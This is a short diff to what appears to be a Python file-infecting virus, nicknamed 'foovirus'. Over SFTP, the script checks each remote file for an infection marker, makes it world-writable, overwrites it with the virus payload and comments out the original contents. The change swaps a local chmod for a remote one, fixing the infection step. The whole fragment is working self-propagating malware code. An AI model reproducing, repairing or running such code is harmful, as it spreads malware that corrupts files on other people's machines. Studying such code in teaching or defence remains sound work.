@@ -124,7 +124,7 @@ while True:
                         IN.close()
                         print(all_of_it)
                         if any('foovirus' in line for line in all_of_it): continue
-                        os.chmod(item, 0o777)
+                        sftp.chmod(item, 0o777)
                         OUT = sftp.file(item, 'w')
                         OUT.writelines(virus)
                         all_of_it = ['#' + line for line in all_of_it]
